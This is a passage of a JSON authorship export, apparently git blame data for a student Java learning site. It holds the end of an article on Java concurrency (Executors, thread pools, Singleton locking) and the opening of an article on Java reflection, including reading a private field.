      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "While it is easy to create one or two threads and run them, it becomes a problem when your application requires creating 20 or 30 threads for running tasks concurrently. This is where the `Executors` class comes in. It helps you with:"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Thread Creation**\u003cbr\u003e"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "It provides various methods for creating threads, more specifically a pool of threads, to run tasks concurrently."
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Thread Management**\u003cbr\u003e"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "It manages the life cycle of the threads in the thread pool. You don’t need to worry about whether the threads in the thread pool are active, busy or dead before submitting a task for execution. "
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Task submission and execution**\u003cbr\u003e"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "It provides methods for submitting tasks for execution in the thread pool, and also allows you to decide when the tasks will be executed. For example, a task can be submitted to be executed instantly, scheduled to be executed later or even executed periodically. Tasks are submitted to a thread pool via an internal queue called the `Blocking Queue`. If there are more tasks than the number of active threads, they are queued until a thread becomes available. New tasks are rejected if the blocking queue is full."
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "The `Executors` class provides convenient factory methods for creating the `ExecutorService` class. This class manages the lifecycle of tasks in various ways by assigning a `ThreadPool` to it. Different thread pools manage tasks in different ways along with their own advantages and disadvantages. Some of these include:"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "* `CachedThreadPool` - Creates new threads as they are needed. This would prove useful for short-lived tasks but otherwise would be resource intensive as it would create too many threads."
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "* `FixedThreadPool` -  A thread pool with a fixed number of threads. If all threads are active when a new task is submitted, they will be queued until a thread becomes available. This can come in handy when you know exactly how many threads you need, though that may be tricky by itself."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "* `ThreadPoolExecutor` - This thread pool implementation adds the ability to configure parameters such as the maximum number of threads it can hold and how long to keep extra threads alive."
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "Shown below is an image to illustrate how `ExecutorService` and `ThreadPools` are connected (Do note that the `Executor` is not in the image as it creates the `ExecutorService`):"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "![ExecutorService and ThreadPools](https://www.callicoder.com/assets/images/post/large/executor-service-thread-pool-blocking-queue-example.jpg)"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "A simple example of using the `Executors` class is shown below where after passing in the task to be executed, it is automatically managed by the `ExecutorService`. For a more detailed look at the workflow of the `ExecutorService`, see this [in-depth tutorial](https://www.callicoder.com/java-executor-service-and-thread-pool-tutorial/).  "
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "ExecutorService executor \u003d Executors.newFixedThreadPool(10); "
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "executor.execute(() -\u003e {  "
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "    System.out.println(\"Hello from: \" + Thread.currentThread().getName());"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "});"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "executor.shutdown(); // Remember to shutdown the thread."
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "And the corresponding output would be `Hello from: pool-1-thread-1`."
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "## Disadvantages of Java Concurrency"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "As the saying goes, _there is no free lunch_. While concurrency provides great benefits as mentioned above, it does come with several issues such as:"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "* **A more complex design**\u003cbr\u003e"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "Due to the creation of multiple threads and the problem of thread interference, the design becomes more complex as much more work is done to manage these threads such that no problem occurs when the application runs. For instance, take a look at these two implementations of the `Singleton` design pattern: "
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "Concurrent implementation where you have to ensure that thread interference does not happen"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "public class Singleton{"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "    private static Singleton singleton;"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "    // Create a lock so only one thread can access this object at a time."
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "    private static final Lock lock \u003d new ReentrantLock();  "
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "    private Singleton() {"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "        //..."
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "     "
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "    public static Singleton getSingleton() {"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "        // This thread has acquired this object, so lock to ensure other threads don\u0027t interfere."
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "        lock.lock();  "
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "        try {"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "            if (singleton \u003d\u003d null) {"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "                singleton \u003d new Singleton();"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "            }"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "        } finally {"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "            // Release lock once you\u0027re done so others can access this object."
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "            lock.unlock();  "
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "        }"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "        return singleton;"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "     }"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "Vs the usual implementation"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "public class Singleton {"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "    private static Singleton singleton;"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "    private Singleton() {"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "        //..."
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "     "
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "    public static Singleton getSingleton() {"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "        if (singleton \u003d\u003d null) { "
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "            singleton \u003d new Singleton();"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "        }"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "        return singleton;"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "```  "
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "* **Harder debugging and testing process**\u003cbr\u003e"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "The unpredictable nature of threads result in errors that can be hard to detect, reproduce and fix as these errors don\u0027t crop up consistently like normal errors do."
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "* **Context switching overhead**\u003cbr\u003e"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": "When a CPU switches from executing one thread to executing another, the CPU needs to save the state of the current thread, and load the state of the next thread to execute, making this process of context switching very expensive."
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": "The following resources are the many in-depth tutorials that will help you get a better grasp of concurrency in Java."
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "* [Seven part series on the basics of Concurrency in Java](https://baptiste-wicht.com/posts/2010/05/java-concurrency-part-1-threads.html)"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [High-level overview of Concurrency in Java by Vogella](https://www.vogella.com/tutorials/JavaConcurrency/article.html#concurrency)"
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "* [Concurrency best practices](https://www.javacodegeeks.com/2015/09/concurrency-best-practices.html)"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": "* [Java 101: Understanding Java threads](https://www.javaworld.com/article/2074217/java-concurrency/java-101--understanding-java-threads--part-1--introducing-threads-and-runnables.html)"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "* [Java Concurrency / Multithreading Tutorial by Jenkov](http://tutorials.jenkov.com/java-concurrency/index.html)"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": "* [Java Concurrency Tutorial by tutorialspoint](https://www.tutorialspoint.com/java_concurrency/concurrency_overview.htm)"
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "### Further Reading"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": "The following resources are interesting reads for a deeper understanding."
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "* [What is the difference between a process and a thread in Java?](https://beginnersbook.com/2015/01/what-is-the-difference-between-a-process-and-a-thread-in-java/)"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "* [Computer Science Stack Exchange Post on the difference between Concurrency and Parallelism](https://cs.stackexchange.com/questions/19987/difference-between-parallel-and-concurrent-programming)"
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": "* [Java Locks and Atomic Variables Tutorial](https://www.callicoder.com/java-locks-and-atomic-variables-tutorial/)"
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": "* [A comparison between concurrency in Golang and Java](https://www.quora.com/What-is-the-advantage-of-Googles-Golang-over-Java-and-Scala)"
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 2,
      "iskandarzulkarnaien": 3,
      "-": 232
    }
  },
  {
    "path": "contents/java/JavaReflections.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: \"Advanced Java: Reflections\""
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  pageNav: 4"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Advanced Java: Reflections"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Jeremy Goh](https://github.com/MightyCupcakes), [Yong Zhi Yuan](https://github.com/Zhiyuan-Amos)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Reflection‎](#reflection)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [What is Java reflections‎](#what-is-java-reflections)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [The Basics of Reflections‎](#the-basics-of-reflections)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Getting Started‎](#getting-started)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Applications‎](#applications)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Accessing Private Fields](#accessing-private-fields)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Updating Private Fields](#updating-private-fields)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Testing Private Methods](#testing-private-methods)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [A More Advanced Application](#a-more-advanced-application)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Disadvantages of Reflections‎](#disadvantages-of-reflections)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Further Resources for Reflections‎](#further-resources-for-reflections)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "## Reflection"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### What is Java Reflections?"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "Reflection is the ability of a computer program to examine, inspect and modify its own behaviour at runtime. In particular, reflections in Java allows the inspection of classes, methods and fields during runtime, without having any knowledge of it during compile time."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "With Java reflections, you can:"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "1. Access private fields and methods of a class without having to modify the visibility modifier of the class itself. This is very useful if you are interested to implement test cases for private methods."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "1. Create new instance of existing objects, invoke methods and change values of fields of existing objects."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "### The Basics of Reflections"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "Before getting started with reflections in Java, it is important to realize that a class is also an object. From the [Java Class API](https://docs.oracle.com/javase/9/docs/api/java/lang/Class.html), we see that `Class` is a subclass of `Object`. Every unique `Object` is assigned an immutable `Class` object by the JVM. This immutable `Class` object is fundamentally different from *instances* of a class. The class object itself holds information such as its name and the package it resides in while an instance of a class holds the instanced values and methods as defined in the class."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "Take for example the following class:"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "public class Student {"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "  private final String name;"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "  private final String gender;"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "  public Student(String name, String gender) {"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "    this.name \u003d name;"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "    this.gender \u003d gender;"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "  // Other methods here..."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "An instance of `Student` class can be created as usual using the `new` keyword:"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "Student john \u003d new Student(\"John Doe\", \"Male\");"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "However, it is also possible to get information about the `Student` class itself because the class itself is an `Object`:"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "Class\u003cStudent\u003e studentClass \u003d Student.class;"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "This means that you can store any `Class` object in any data structure for future retrieval. This is the main entry point for Java\u0027s reflections. You can now get the name of the class, create new instances of the class, observe its public/private fields - the possibilities are endless!"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "### Getting Started"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "There are many webpages dedicated to explaining the details of reflections in Java; so this will not repeat what is being made readily available on the web. One good place to start is this [article by JavaWorld](https://www.javaworld.com/article/2077015/java-se/take-an-in-depth-look-at-the-java-reflection-api.html)."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "One important point is that while Java reflections are powerful, its implementations are not very straightforward. There are however some libraries out there such as the [Google\u0027s Guava library](https://github.com/google/guava/wiki/ReflectionExplained) which contains many utility methods and classes that makes our life easier."
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "### Applications"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Accessing Private Fields"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "A good example of reflections is to get a private field of another class. While this should optimally be solved by modifying the field visibility to `protected` or `public`, sometimes it is not possible to do so because you might not have any access to the code (for example codes in libraries or frameworks)."
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "For the sake of simplicity, let us use a example of a simple `Animal` class. The class definition can look like this."
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "public class Animal {"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "  private int age;"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "  public Animal() {"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "    age \u003d 0;"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "And let us assume that you, for some reason, cannot modify this code. But you are interested in making a new class `Sheep` that extends `Animal` and do something when his age reaches certain threshold. But the annoying thing is that somebody decided that it is a good idea to make the age value `private` (and without a getter method!) instead of `protected` in a top-level class such as this! So you cannot access the age of your `Sheep` even though it is an `Animal`."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "This of course can be solved by Reflection as follows:"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "public class Sheep extends Animal {"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "  public Sheep() {"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "    super();"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "  /**"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "   * A sheep begins to produce wool after it\u0027s a year old!"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "   */"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "  public boolean isProducingWool() {"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "    return getAge() \u003e 1;"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "  private int getAge() {"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "    // Since class is a reserved keyword, we use clazz in variable names"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "    Class\u003cAnimal\u003e animalClazz \u003d Animal.class;"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "    try {"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "      Field f \u003d animalClazz.getDeclaredField(\"age\");"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "      f.setAccessible(true);"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "      return (int) f.get(this);"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "    } catch (IllegalAccessException | NoSuchFieldException e) {"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "      // perform error handling"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
